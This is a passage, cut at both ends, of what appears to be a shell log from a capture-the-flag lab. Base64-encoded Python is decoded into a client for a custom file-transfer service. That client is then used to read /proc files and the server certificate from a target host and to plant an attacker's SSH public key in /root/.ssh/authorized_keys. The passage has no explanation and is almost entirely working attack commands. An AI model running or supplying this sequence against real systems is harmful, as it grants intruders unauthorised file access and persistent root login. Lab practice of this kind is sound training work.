JvcjogQmxvY2sgbnVtYmVyIG11c3QgYmUgMiBieXRlcyBsb25nLicpDQogICAgICAgIHJldHVybiBGYWxzZQ0KICAgIHBrdCA9IGJ5dGVhcnJheSgpDQogICAgcGt0LmFwcGVuZCgwKQ0KICAgIHBrdC5hcHBlbmQob3Bjb2Rlc1snZGF0YSddKQ0KICAgIHBrdCArPSBieXRlYXJyYXkoYmxvY2tfbnVtKQ0KICAgIHBrdCArPSBieXRlYXJyYXkoYmxvY2spDQogICAgc29jay5zZW5kdG8ocGt0LCBzZXJ2ZXIpDQoNCmRlZiBnZXRfZmlsZShzcmNfZmlsZSwgZGVzdF9maWxlLCBtb2RlKToNCiAgICBoID0gU0hBMjU2Lm5ldyhzcmNfZmlsZSkNCiAgICBzaWduYXR1cmUgPSBiYXNlNjQuYjY0ZW5jb2RlKHBzcy5uZXcocHJpdmtleSkuc2lnbihoKSkNCg0KICAgIHNlbmRfcnJxKHNyY19maWxlLCBtb2RlLCBzaWduYXR1cmUsIHNlcnZlcl9hZGRyZXNzKQ0KICAgIA0KICAgIGZpbGUgPSBvcGVuKGRlc3RfZmlsZSwgIndiIikNCg0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIGRhdGEsIHNlcnZlciA9IHNvY2sucmVjdmZyb20oTUFYX1NJWkUgKiAzKQ0KDQogICAgICAgIGlmIGRhdGFbMV0gPT0gb3Bjb2Rlc1snZXJyb3InXToNCiAgICAgICAgICAgIGVycm9yX2NvZGUgPSBpbnQuZnJvbV9ieXRlcyhkYXRhWzI6NF0sIGJ5dGVvcmRlcj0nYmlnJykNCiAgICAgICAgICAgIHByaW50KGRhdGFbNDpdKQ0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgc2VuZF9hY2soZGF0YVsyOjRdLCBzZXJ2ZXIpDQogICAgICAgIGNvbnRlbnQgPSBkYXRhWzQ6XQ0KICAgICAgICBjb250ZW50ID0gYmFzZTY0LmI2NGRlY29kZShjb250ZW50KQ0KICAgICAgICBjb250ZW50ID0gZGVjcnlwdChjb250ZW50LCBwcml2a2V5KQ0KICAgICAgICBmaWxlLndyaXRlKGNvbnRlbnQpDQogICAgICAgIGlmIGxlbihjb250ZW50KSA8IE1BWF9TSVpFOg0KICAgICAgICAgICAgcHJpbnQoImZpbGUgcmVjZWl2ZWQhIikNCiAgICAgICAgICAgIGJyZWFrDQoNCmRlZiBwdXRfZmlsZShzcmNfZmlsZSwgZGVzdF9maWxlLCBtb2RlKToNCiAgICBpZiBub3Qgc2VydmVyX3B1YmtleToNCiAgICAgICAgcHJpbnQoIkVycm9yOiBTZXJ2ZXIgcHVia2V5IG5vdCBjb25maWd1cmVkLiBZb3Ugd29uJ3QgYmUgYWJsZSB0byBQVVQiKQ0KICAgICAgICByZXR1cm4NCg0KICAgIHRyeToNCiAgICAgICAgZmlsZSA9IG9wZW4oc3JjX2ZpbGUsICJyYiIpDQogICAgICAgIGZkYXRhID0gZmlsZS5yZWFkKCkNCiAgICAgICAgdG90YWxfbGVuID0gbGVuKGZkYXRhKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcHJpbnQoIkVycm9yOiBGaWxlIGRvZXNuJ3QgZXhpc3QiKQ0KICAgICAgICByZXR1cm4gRmFsc2UNCg0KICAgIHNlbmRfd3JxKGRlc3RfZmlsZSwgbW9kZSwgc2VydmVyX2FkZHJlc3MpDQogICAgZGF0YSwgc2VydmVyID0gc29jay5yZWN2ZnJvbShNQVhfU0laRSAqIDMpDQogICAgDQogICAgaWYgZGF0YSAhPSBiJ1x4MDBceDA0XHgwMFx4MDAnOiAjIGFjayAwDQogICAgICAgIHByaW50KCJFcnJvcjogU2VydmVyIGRpZG4ndCByZXNwb25kIHdpdGggQUNLIHRvIFdSUSIpDQogICAgICAgIHJldHVybiBGYWxzZQ0KDQogICAgYmxvY2tfbnVtID0gMQ0KICAgIHdoaWxlIGxlbihmZGF0YSkgPiAwOg0KICAgICAgICBiX2Jsb2NrX251bSA9IGJsb2NrX251bS50b19ieXRlcygyLCAnYmlnJykNCiAgICAgICAgYmxvY2sgPSBmZGF0YVs6TUFYX1NJWkVdDQogICAgICAgIGJsb2NrID0gZW5jcnlwdChibG9jaywgc2VydmVyX3B1YmtleSkNCiAgICAgICAgYmxvY2sgPSBiYXNlNjQuYjY0ZW5jb2RlKGJsb2NrKQ0KICAgICAgICBmZGF0YSA9IGZkYXRhW01BWF9TSVpFOl0NCiAgICAgICAgc2VuZF9kYXRhKHNlcnZlciwgYl9ibG9ja19udW0sIGJsb2NrKQ0KICAgICAgICBkYXRhLCBzZXJ2ZXIgPSBzb2NrLnJlY3Zmcm9tKE1BWF9TSVpFICogMykNCiAgICAgICAgDQogICAgICAgIGlmIGRhdGEgIT0gYidceDAwXHgwNCcgKyBiX2Jsb2NrX251bToNCiAgICAgICAgICAgIHByaW50KCJFcnJvcjogU2VydmVyIHNlbnQgdW5leHBlY3RlZCByZXNwb25zZSIpDQogICAgICAgICAgICByZXR1cm4gRmFsc2UNCg0KICAgICAgICBibG9ja19udW0gKz0gMQ0KDQogICAgaWYgdG90YWxfbGVuICUgTUFYX1NJWkUgPT0gMDoNCiAgICAgICAgYl9ibG9ja19udW0gPSBibG9ja19udW0udG9fYnl0ZXMoMiwgJ2JpZycpDQogICAgICAgIHNlbmRfZGF0YShzZXJ2ZXIsIGJfYmxvY2tfbnVtLCBiIiIpDQogICAgICAgIGRhdGEsIHNlcnZlciA9IHNvY2sucmVjdmZyb20oTUFYX1NJWkUgKiAzKQ0KICAgICAgICANCiAgICAgICAgaWYgZGF0YSAhPSBiJ1x4MDBceDA0JyArIGJfYmxvY2tfbnVtOg0KICAgICAgICAgICAgcHJpbnQoIkVycm9yOiBTZXJ2ZXIgc2VudCB1bmV4cGVjdGVkIHJlc3BvbnNlIikNCiAgICAgICAgICAgIHJldHVybiBGYWxzZQ0KDQogICAgcHJpbnQoIkZpbGUgc2VudCBzdWNjZXNzZnVsbHkiKQ0KICAgIHJldHVybiBUcnVlDQoNCmRlZiBtYWluKCk6DQogICAgb3AgPSBzeXMuYXJndlszXQ0KICAgIHNyY19maWxlID0gc3lzLmFyZ3ZbNF0uZW5jb2RlKCkNCiAgICBkZXN0X2ZpbGUgPSBzeXMuYXJndls1XS5lbmNvZGUoKQ0KICAgIG1vZGUgPSBiJ25ldGFzY2lpJw0KICAgIGlmIG9wID09ICJnZXQiOg0KICAgICAgICBnZXRfZmlsZShzcmNfZmlsZSwgZGVzdF9maWxlLCBtb2RlKQ0KICAgIGVsaWYgb3AgPT0gInB1dCI6DQogICAgICAgIHB1dF9maWxlKHNyY19maWxlLCBkZXN0X2ZpbGUsIG1vZGUpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoIkludmFsaWQgb3BlcmF0aW9uLiIpDQogICAgZXhpdCgwKQ0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIG1haW4oKQ==' | base64 -d | tee client.py
import sys
import socket
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
...
```

```bash
echo 'aW1wb3J0IHN5cw0KaW1wb3J0IHNvY2tldA0KZnJvbSBDcnlwdG8uUHVibGljS2V5IGltcG9ydCBSU0ENCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgUEtDUzFfT0FFUA0KZnJvbSBDcnlwdG8uU2lnbmF0dXJlIGltcG9ydCBwc3MNCmZyb20gQ3J5cHRvLkhhc2ggaW1wb3J0IFNIQTI1Ng0KaW1wb3J0IGJpbmFzY2lpDQppbXBvcnQgYmFzZTY0DQoNCk1BWF9TSVpFID0gMjAwDQoNCm9wY29kZXMgPSB7DQogICAgJ3JlYWQnOiAxLA0KICAgICd3cml0ZSc6IDIsDQogICAgJ2RhdGEnOiAzLA0KICAgICdhY2snOiA0LA0KICAgICdlcnJvcic6IDUNCn0NCg0KbW9kZV9zdHJpbmdzID0gWyduZXRhc2NpaScsICdvY3RldCcsICdtYWlsJ10NCg0Kd2l0aCBvcGVuKCJjbGllbnQua2V5IiwgInJiIikgYXMgZjoNCiAgICBkYXRhID0gZi5yZWFkKCkNCiAgICBwcml2a2V5ID0gUlNBLmltcG9ydF9rZXkoZGF0YSkNCg0Kd2l0aCBvcGVuKCJjbGllbnQuY3J0IiwgInJiIikgYXMgZjoNCiAgICBkYXRhID0gZi5yZWFkKCkNCiAgICBwdWJrZXkgPSBSU0EuaW1wb3J0X2tleShkYXRhKQ0KDQp0cnk6DQogICAgd2l0aCBvcGVuKCJzZXJ2ZXIuY3J0IiwgInJiIikgYXMgZjoNCiAgICAgICAgZGF0YSA9IGYucmVhZCgpDQogICAgICAgIHNlcnZlcl9wdWJrZXkgPSBSU0EuaW1wb3J0X2tleShkYXRhKQ0KZXhjZXB0Og0KICAgIHNlcnZlcl9wdWJrZXkgPSBGYWxzZQ0KDQpzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pDQpzb2NrLnNldHRpbWVvdXQoMy4wKQ0Kc2VydmVyX2FkZHJlc3MgPSAoc3lzLmFyZ3ZbMV0sIGludChzeXMuYXJndlsyXSkpDQoNCmRlZiBlbmNyeXB0KHMsIHB1YmtleSk6DQogICAgY2lwaGVyID0gUEtDUzFfT0FFUC5uZXcocHVia2V5KQ0KICAgIHJldHVybiBjaXBoZXIuZW5jcnlwdChzKQ0KDQpkZWYgZGVjcnlwdChzLCBwcml2a2V5KToNCiAgICBjaXBoZXIgPSBQS0NTMV9PQUVQLm5ldyhwcml2a2V5KQ0KICAgIHJldHVybiBjaXBoZXIuZGVjcnlwdChzKQ0KDQpkZWYgc2VuZF9ycnEoZmlsZW5hbWUsIG1vZGUsIHNpZ25hdHVyZSwgc2VydmVyKToNCiAgICBycnEgPSBieXRlYXJyYXkoKQ0KICAgIHJycS5hcHBlbmQoMCkNCiAgICBycnEuYXBwZW5kKG9wY29kZXNbJ3JlYWQnXSkNCiAgICBycnEgKz0gYnl0ZWFycmF5KGZpbGVuYW1lKQ0KICAgIHJycS5hcHBlbmQoMCkNCiAgICBycnEgKz0gYnl0ZWFycmF5KG1vZGUpDQogICAgcnJxLmFwcGVuZCgwKQ0KICAgIHJycSArPSBieXRlYXJyYXkoc2lnbmF0dXJlKQ0KICAgIHJycS5hcHBlbmQoMCkNCiAgICBzb2NrLnNlbmR0byhycnEsIHNlcnZlcikNCiAgICByZXR1cm4gVHJ1ZQ0KDQpkZWYgc2VuZF93cnEoZmlsZW5hbWUsIG1vZGUsIHNlcnZlcik6DQogICAgd3JxID0gYnl0ZWFycmF5KCkNCiAgICB3cnEuYXBwZW5kKDApDQogICAgd3JxLmFwcGVuZChvcGNvZGVzWyd3cml0ZSddKQ0KICAgIHdycSArPSBieXRlYXJyYXkoZmlsZW5hbWUpDQogICAgd3JxLmFwcGVuZCgwKQ0KICAgIHdycSArPSBieXRlYXJyYXkobW9kZSkNCiAgICB3cnEuYXBwZW5kKDApDQogICAgc29jay5zZW5kdG8od3JxLCBzZXJ2ZXIpDQogICAgcmV0dXJuIFRydWUNCg0KZGVmIHNlbmRfYWNrKGJsb2NrX251bWJlciwgc2VydmVyKToNCiAgICBpZiBsZW4oYmxvY2tfbnVtYmVyKSAhPSAyOg0KICAgICAgICBwcmludCgnRXJyb3I6IEJsb2NrIG51bWJlciBtdXN0IGJlIDIgYnl0ZXMgbG9uZy4nKQ0KICAgICAgICByZXR1cm4gRmFsc2UNCiAgICBhY2sgPSBieXRlYXJyYXkoKQ0KICAgIGFjay5hcHBlbmQoMCkNCiAgICBhY2suYXBwZW5kKG9wY29kZXNbJ2FjayddKQ0KICAgIGFjayArPSBieXRlYXJyYXkoYmxvY2tfbnVtYmVyKQ0KICAgIHNvY2suc2VuZHRvKGFjaywgc2VydmVyKQ0KICAgIHJldHVybiBUcnVlDQoNCmRlZiBzZW5kX2Vycm9yKHNlcnZlciwgY29kZSwgbXNnKToNCiAgICBlcnIgPSBieXRlYXJyYXkoKQ0KICAgIGVyci5hcHBlbmQoMCkNCiAgICBlcnIuYXBwZW5kKG9wY29kZXNbJ2Vycm9yJ10pDQogICAgZXJyLmFwcGVuZCgwKQ0KICAgIGVyci5hcHBlbmQoY29kZSAmIDB4ZmYpDQogICAgcGt0ICs9IGJ5dGVhcnJheShtc2cgKyBiJ1wwJykNCiAgICBzb2NrLnNlbmR0byhwa3QsIHNlcnZlcikNCg0KZGVmIHNlbmRfZGF0YShzZXJ2ZXIsIGJsb2NrX251bSwgYmxvY2spOg0KICAgIGlmIGxlbihibG9ja19udW0pICE9IDI6DQogICAgICAgIHByaW50KCdFcnJvcjogQmxvY2sgbnVtYmVyIG11c3QgYmUgMiBieXRlcyBsb25nLicpDQogICAgICAgIHJldHVybiBGYWxzZQ0KICAgIHBrdCA9IGJ5dGVhcnJheSgpDQogICAgcGt0LmFwcGVuZCgwKQ0KICAgIHBrdC5hcHBlbmQob3Bjb2Rlc1snZGF0YSddKQ0KICAgIHBrdCArPSBieXRlYXJyYXkoYmxvY2tfbnVtKQ0KICAgIHBrdCArPSBieXRlYXJyYXkoYmxvY2spDQogICAgc29jay5zZW5kdG8ocGt0LCBzZXJ2ZXIpDQoNCmRlZiBnZXRfZmlsZShzcmNfZmlsZSwgZGVzdF9maWxlLCBtb2RlKToNCiAgICBoID0gU0hBMjU2Lm5ldyhzcmNfZmlsZSkNCiAgICBzaWduYXR1cmUgPSBiYXNlNjQuYjY0ZW5jb2RlKHBzcy5uZXcocHJpdmtleSkuc2lnbihoKSkNCg0KICAgIHNlbmRfcnJxKHNyY19maWxlLCBtb2RlLCBzaWduYXR1cmUsIHNlcnZlcl9hZGRyZXNzKQ0KICAgIA0KICAgIGZpbGUgPSBvcGVuKGRlc3RfZmlsZSwgIndiIikNCg0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIGRhdGEsIHNlcnZlciA9IHNvY2sucmVjdmZyb20oTUFYX1NJWkUgKiAzKQ0KDQogICAgICAgIGlmIGRhdGFbMV0gPT0gb3Bjb2Rlc1snZXJyb3InXToNCiAgICAgICAgICAgIGVycm9yX2NvZGUgPSBpbnQuZnJvbV9ieXRlcyhkYXRhWzI6NF0sIGJ5dGVvcmRlcj0nYmlnJykNCiAgICAgICAgICAgIHByaW50KGRhdGFbNDpdKQ0KICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgc2VuZF9hY2soZGF0YVsyOjRdLCBzZXJ2ZXIpDQogICAgICAgIGNvbnRlbnQgPSBkYXRhWzQ6XQ0KICAgICAgICBjb250ZW50ID0gYmFzZTY0LmI2NGRlY29kZShjb250ZW50KQ0KICAgICAgICBjb250ZW50ID0gZGVjcnlwdChjb250ZW50LCBwcml2a2V5KQ0KICAgICAgICBmaWxlLndyaXRlKGNvbnRlbnQpDQogICAgICAgIGlmIGxlbihjb250ZW50KSA8IE1BWF9TSVpFOg0KICAgICAgICAgICAgcHJpbnQoImZpbGUgcmVjZWl2ZWQhIikNCiAgICAgICAgICAgIGJyZWFrDQoNCmRlZiBwdXRfZmlsZShzcmNfZmlsZSwgZGVzdF9maWxlLCBtb2RlKToNCiAgICBpZiBub3Qgc2VydmVyX3B1YmtleToNCiAgICAgICAgcHJpbnQoIkVycm9yOiBTZXJ2ZXIgcHVia2V5IG5vdCBjb25maWd1cmVkLiBZb3Ugd29uJ3QgYmUgYWJsZSB0byBQVVQiKQ0KICAgICAgICByZXR1cm4NCg0KICAgIHRyeToNCiAgICAgICAgZmlsZSA9IG9wZW4oc3JjX2ZpbGUsICJyYiIpDQogICAgICAgIGZkYXRhID0gZmlsZS5yZWFkKCkNCiAgICAgICAgdG90YWxfbGVuID0gbGVuKGZkYXRhKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcHJpbnQoIkVycm9yOiBGaWxlIGRvZXNuJ3QgZXhpc3QiKQ0KICAgICAgICByZXR1cm4gRmFsc2UNCg0KICAgIHNlbmRfd3JxKGRlc3RfZmlsZSwgbW9kZSwgc2VydmVyX2FkZHJlc3MpDQogICAgZGF0YSwgc2VydmVyID0gc29jay5yZWN2ZnJvbShNQVhfU0laRSAqIDMpDQogICAgDQogICAgaWYgZGF0YSAhPSBiJ1x4MDBceDA0XHgwMFx4MDAnOiAjIGFjayAwDQogICAgICAgIHByaW50KCJFcnJvcjogU2VydmVyIGRpZG4ndCByZXNwb25kIHdpdGggQUNLIHRvIFdSUSIpDQogICAgICAgIHJldHVybiBGYWxzZQ0KDQogICAgYmxvY2tfbnVtID0gMQ0KICAgIHdoaWxlIGxlbihmZGF0YSkgPiAwOg0KICAgICAgICBiX2Jsb2NrX251bSA9IGJsb2NrX251bS50b19ieXRlcygyLCAnYmlnJykNCiAgICAgICAgYmxvY2sgPSBmZGF0YVs6TUFYX1NJWkVdDQogICAgICAgIGJsb2NrID0gZW5jcnlwdChibG9jaywgc2VydmVyX3B1YmtleSkNCiAgICAgICAgYmxvY2sgPSBiYXNlNjQuYjY0ZW5jb2RlKGJsb2NrKQ0KICAgICAgICBmZGF0YSA9IGZkYXRhW01BWF9TSVpFOl0NCiAgICAgICAgc2VuZF9kYXRhKHNlcnZlciwgYl9ibG9ja19udW0sIGJsb2NrKQ0KICAgICAgICBkYXRhLCBzZXJ2ZXIgPSBzb2NrLnJlY3Zmcm9tKE1BWF9TSVpFICogMykNCiAgICAgICAgDQogICAgICAgIGlmIGRhdGEgIT0gYidceDAwXHgwNCcgKyBiX2Jsb2NrX251bToNCiAgICAgICAgICAgIHByaW50KCJFcnJvcjogU2VydmVyIHNlbnQgdW5leHBlY3RlZCByZXNwb25zZSIpDQogICAgICAgICAgICByZXR1cm4gRmFsc2UNCg0KICAgICAgICBibG9ja19udW0gKz0gMQ0KDQogICAgaWYgdG90YWxfbGVuICUgTUFYX1NJWkUgPT0gMDoNCiAgICAgICAgYl9ibG9ja19udW0gPSBibG9ja19udW0udG9fYnl0ZXMoMiwgJ2JpZycpDQogICAgICAgIHNlbmRfZGF0YShzZXJ2ZXIsIGJfYmxvY2tfbnVtLCBiIiIpDQogICAgICAgIGRhdGEsIHNlcnZlciA9IHNvY2sucmVjdmZyb20oTUFYX1NJWkUgKiAzKQ0KICAgICAgICANCiAgICAgICAgaWYgZGF0YSAhPSBiJ1x4MDBceDA0JyArIGJfYmxvY2tfbnVtOg0KICAgICAgICAgICAgcHJpbnQoIkVycm9yOiBTZXJ2ZXIgc2VudCB1bmV4cGVjdGVkIHJlc3BvbnNlIikNCiAgICAgICAgICAgIHJldHVybiBGYWxzZQ0KDQogICAgcHJpbnQoIkZpbGUgc2VudCBzdWNjZXNzZnVsbHkiKQ0KICAgIHJldHVybiBUcnVlDQoNCmRlZiBtYWluKCk6DQogICAgb3AgPSBzeXMuYXJndlszXQ0KICAgIHNyY19maWxlID0gc3lzLmFyZ3ZbNF0uZW5jb2RlKCkNCiAgICBkZXN0X2ZpbGUgPSBzeXMuYXJndls1XS5lbmNvZGUoKQ0KICAgIG1vZGUgPSBiJ25ldGFzY2lpJw0KICAgIGlmIG9wID09ICJnZXQiOg0KICAgICAgICBnZXRfZmlsZShzcmNfZmlsZSwgZGVzdF9maWxlLCBtb2RlKQ0KICAgIGVsaWYgb3AgPT0gInB1dCI6DQogICAgICAgIHB1dF9maWxlKHNyY19maWxlLCBkZXN0X2ZpbGUsIG1vZGUpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoIkludmFsaWQgb3BlcmF0aW9uLiIpDQogICAgZXhpdCgwKQ0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIG1haW4oKQ==' | base64 -d | tee client.py
...
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDj8QgZs7YlVklO9enBRLKfmG1O1DaBgaFUv5Uhfvly3hxNclRwATLR0IilWtOAtRraz45fOFA+XcgXyDn8scemXmXgVy412kkbC0xB6oaSI0zWZYPnvztmW+674j3mm192CUH0wMh6KJJXXRKFjT5epjZlMWkwmxrSiOrf+p8e7sGig9OKIowrOw9KBteDelnofd7slUkAltyL2cnn6ZYwTaYD5NRSerZL1RYEsMoHguDIvYoogo1IEMsZ2t0VGic1BFAvKTpC9hth+3RBYancOSWSeAUuPevhLaUPVQC+ikgc2rTiDHvAIL9IHZNmHkw93UdhGDATEjq8BT7yipv+uQdkdBTBR41BM8oM1TV6tHxrbUccL/7D7OZ72vS+Vf8Ayrpc1L+EnIBHuSDoik9xPY1cQMiQ8IUH17dfNz4YjTD0K0ua2KsO16H1tvworSsIUg6T9irxMvgrEvXKz+mHn0gM9QPwaiPalUMaoViiO7B5PP2Rk8SOvua+ixIQbB0= root@ip-10-10-168-139' > id_rsa.pub
...
python3 client.py 172.17.0.1 69 get /proc/self/status status
python3 client.py 172.17.0.1 69 get /proc/self/cmdline cmdline
python3 client.py 172.17.0.1 69 get /opt/3M-syncserver/server.crt server.crt
python3 client.py 172.17.0.1 69 put id_rsa.pub /root/.ssh/authorized_keys
python3 client.py 172.17.0.1 69 get /root/.ssh/authorized_keys authorized_keys
...
echo 'aW1wb3J0IHN5cw0KaW1wb3J0IHNvY2tldA0KZnJvbSBDcnlwdG8uUHVibGljS2V5IGltcG9ydCBSU0ENCmZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgUEtDUzFfT0FFUA0KZnJvbSBDcnlwdG8uU2lnbmF0dXJlIGltcG9ydCBwc3MNCmZyb20gQ3J5cHRvLkhhc2ggaW1wb3J0IFNIQTI1Ng0KaW1wb3J0IGJpbmFzY2lpDQppbXBvcnQgYmFzZTY0DQoNCk1BWF9TSVpFID0gMjAwDQoNCm9wY29kZXMgPSB7DQogICAgJ3JlYWQnOiAxLA0KICAgICd3cml0ZSc6IDIsDQogICAgJ2RhdGEnOiAzLA0KICAgICdhY2snOiA0LA0KICAgICdlcnJvcic6IDUNCn0NCg0KbW9kZV9zdHJpbmdzID0gWyduZXRhc2NpaScsICdvY3RldCcsICdtYWlsJ10NCg0Kd2l0aCBvcGVuKCJjbGllbnQua2V5IiwgInJiIikgYXMgZjoNCiAgICBkYXRhID0gZi5yZWFkKCkNCiAgICBwcml2a2V5ID0gUlNBLmltcG9ydF9rZXkoZGF0YSkNCg0Kd2l0aCBvcGVuKCJjbGllbnQuY3J0IiwgInJiIikgYXMgZjoNCiAgICBkYXRhID0gZi5yZWFkKCkNCiAgICBwdWJrZXkgPSBSU0EuaW1wb3J0X2tleShkYXRhKQ0KDQp0cnk6DQogICAgd2l0aCBvcGVuKCJzZXJ2ZXIuY3J0IiwgInJiIikgYXMgZjoNCiAgICAgICAgZGF0YSA9IGYucmVhZCgpDQogICAgICAgIHNlcnZlcl9wdWJrZXkgPSBSU0EuaW1wb3J0X2tleShkYXRhKQ0KZXhjZXB0Og0KICAgIHNlcnZlcl9wdWJrZXkgPSBGYWxzZQ0KDQpzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pDQpzb2NrLnNldHRpbWVvdXQoMy4wKQ0Kc2VydmVyX2FkZHJlc3MgPSAoc3lzLmFyZ3ZbMV0sIGludChzeXMuYXJndlsyXSkpDQoNCmRlZiBlbmNyeXB0KHMsIHB1YmtleSk6DQogICAgY2lwaGVyID0gUEtDUzFfT0FFUC5uZXcocHVia2V5KQ0KICAgIHJldHVybiBjaXBoZXIuZW5jcnlwdChzKQ0KDQpkZWYgZGVjcnlwdChzLCBwcml2a2V5KToNCiAgICBjaXBoZXIgPSBQS0NTMV9PQUVQLm5ldyhwcml2a2V5KQ0KICAgIHJldHVybiBjaXBoZXIuZGVjcnlwdChzKQ0KDQpkZWYgc2VuZF9ycnEoZmlsZW5hbWUsIG1vZGUsIHNpZ25hdHVyZSwgc2VydmVyKToNCiAgICBycnEgPSBieXRlYXJyYXkoKQ0KICAgIHJycS5hcHBlbmQoMCkNCiAgICBycnEuYXBwZW5kKG9wY29kZXNbJ3JlYWQnXSkNCiAgICBycnEgKz0gYnl0ZWFycmF5KGZpbGVuYW1lKQ0KICAgIHJycS5hcHBlbmQoMCkNCiAgICBycnEgKz0gYnl0ZWFycmF5KG1vZGUpDQogICAgcnJxLmFwcGVuZCgwKQ0KICAgIHJycSArPSBieXRlYXJyYXkoc2lnbmF0dXJlKQ0KICAgIHJycS5hcHBlbmQoMCkNCiAgICBzb2NrLnNlbmR0byhycnEsIHNlcnZlcikNCiAgICByZXR1cm4gVHJ1ZQ0KDQpkZWYgc2VuZF93cnEoZmlsZW5hbWUsIG1vZGUsIHNlcnZlcik6DQogICAgd3JxID0gYnl0ZWFycmF5KCkNCiAgICB3cnEuYXBwZW5kKDApDQogICAgd3JxLmFwcGVuZChvcGNvZGVzWyd3cml0ZSddKQ0KICAgIHdycSArPSBieXRlYXJyYXkoZmlsZW5hbWUpDQogICAgd3JxLmFwcGVuZCgwKQ0KICAgIHdycSArPSBieXRlYXJyYXkobW9kZSkNCiAgICB3cnEuYXBwZW5kKDApDQogICAgcHJpbnQod3JxKQ0KICAgIHNvY2suc2VuZHRvKHdycSwgc2VydmVyKQ0KICAgIHJldHVybiBUcnVlDQoNCmRlZiBzZW5kX2FjayhibG9ja19udW1iZXIsIHNlcnZlcik6DQogICAgaWYgbGVuKGJsb2NrX251bWJlcikgIT0gMjoNCiAgICAgICAgcHJpbnQoJ0Vycm9yOiBCbG9jayBudW1iZXIgbXVzdCBiZSAyIGJ5dGVzIGxvbmcuJykNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgYWNrID0gYnl0ZWFycmF5KCkNCiAgICBhY2suYXBwZW5kKDApDQogICAgYWNrLmFwcGVuZChvcGNvZGVzWydhY2snXSkNCiAgICBhY2sgKz0gYnl0ZWFycmF5KGJsb2NrX251bWJlcikNCiAgICBzb2NrLnNlbmR0byhhY2ssIHNlcnZlcikNCiAgICByZXR1cm4gVHJ1ZQ0KDQpkZWYgc2VuZF9lcnJvcihzZXJ2ZXIsIGNvZGUsIG1zZyk6DQogICAgZXJyID0gYnl0ZWFycmF5KCkNCiAgICBlcnIuYXBwZW5kKDApDQogICAgZXJyLmFwcGVuZChvcGNvZGVzWydlcnJvciddKQ0KICAgIGVyci5hcHBlbmQoMCkNCiAgICBlcnIuYXBwZW5kKGNvZGUgJiAweGZmKQ0KICAgIHBrdCArPSBieXRlYXJyYXkobXNnICsgYidcMCcpDQogICAgc29jay5zZW5kdG8ocGt0LCBzZXJ2ZXIpDQoNCmRlZiBzZW5kX2RhdGEoc2VydmVyLCBibG9ja19udW0sIGJsb2NrKToNCiAgICBpZiBsZW4oYmxvY2tfbnVtKSAhPSAyOg0KICAgICAgICBwcmludCgnRXJyb3I6IEJsb2NrIG51bWJlciBtdXN0IGJlIDIgYnl0ZXMgbG9uZy4nKQ0KICAgICAgICByZXR1cm4gRmFsc2UNCiAgICBwa3QgPSBieXRlYXJyYXkoKQ0KICAgIHBrdC5hcHBlbmQoMCkNCiAgICBwa3QuYXBwZW5kKG9wY29kZXNbJ2RhdGEnXSkNCiAgICBwa3QgKz0gYnl0ZWFycmF5KGJsb2NrX251bSkNCiAgICBwa3QgKz0gYnl0ZWFycmF5KGJsb2NrKQ0KICAgIHNvY2suc2VuZHRvKHBrdCwgc2VydmVyKQ0KDQpkZWYgZ2V0X2ZpbGUoZmlsZW5hbWUsIG1vZGUpOg0KICAgIGggPSBTSEEyNTYubmV3KGZpbGVuYW1lKQ0KICAgIHNpZ25hdHVyZSA9IGJhc2U2NC5iNjRlbmNvZGUocHNzLm5ldyhwcml2a2V5KS5zaWduKGgpKQ0KDQogICAgc2VuZF9ycnEoZmlsZW5hbWUsIG1vZGUsIHNpZ25hdHVyZSwgc2VydmVyX2FkZHJlc3MpDQogICAgDQogICAgZmlsZSA9IG9wZW4oZmlsZW5hbWUsICJ3YiIpDQoNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICBkYXRhLCBzZXJ2ZXIgPSBzb2NrLnJlY3Zmcm9tKE1BWF9TSVpFICogMykNCg0KICAgICAgICBpZiBkYXRhWzFdID09IG9wY29kZXNbJ2Vycm9yJ106DQogICAgICAgICAgICBlcnJvcl9jb2RlID0gaW50LmZyb21fYnl0ZXMoZGF0YVsyOjRdLCBieXRlb3JkZXI9J2JpZycpDQogICAgICAgICAgICBwcmludChkYXRhWzQ6XSkNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIHNlbmRfYWNrKGRhdGFbMjo0XSwgc2VydmVyKQ0KICAgICAgICBjb250ZW50ID0gZGF0YVs0Ol0NCiAgICAgICAgY29udGVudCA9IGJhc2U2NC5iNjRkZWNvZGUoY29udGVudCkNCiAgICAgICAgY29udGVudCA9IGRlY3J5cHQoY29udGVudCwgcHJpdmtleSkNCiAgICAgICAgZmlsZS53cml0ZShjb250ZW50KQ0KICAgICAgICBpZiBsZW4oY29udGVudCkgPCBNQVhfU0laRToNCiAgICAgICAgICAgIHByaW50KCJmaWxlIHJlY2VpdmVkISIpDQogICAgICAgICAgICBicmVhaw0KDQpkZWYgcHV0X2ZpbGUoZmlsZW5hbWUsIG1vZGUpOg0KICAgIGlmIG5vdCBzZXJ2ZXJfcHVia2V5Og0KICAgICAgICBwcmludCgiRXJyb3I6IFNlcnZlciBwdWJrZXkgbm90IGNvbmZpZ3VyZWQuIFlvdSB3b24ndCBiZSBhYmxlIHRvIFBVVCIpDQogICAgICAgIHJldHVybg0KDQogICAgdHJ5Og0KICAgICAgICBmaWxlID0gb3BlbihmaWxlbmFtZSwgInJiIikNCiAgICAgICAgZmRhdGEgPSBmaWxlLnJlYWQoKQ0KICAgICAgICB0b3RhbF9sZW4gPSBsZW4oZmRhdGEpDQogICAgZXhjZXB0Og0KICAgICAgICBwcmludCgiRXJyb3I6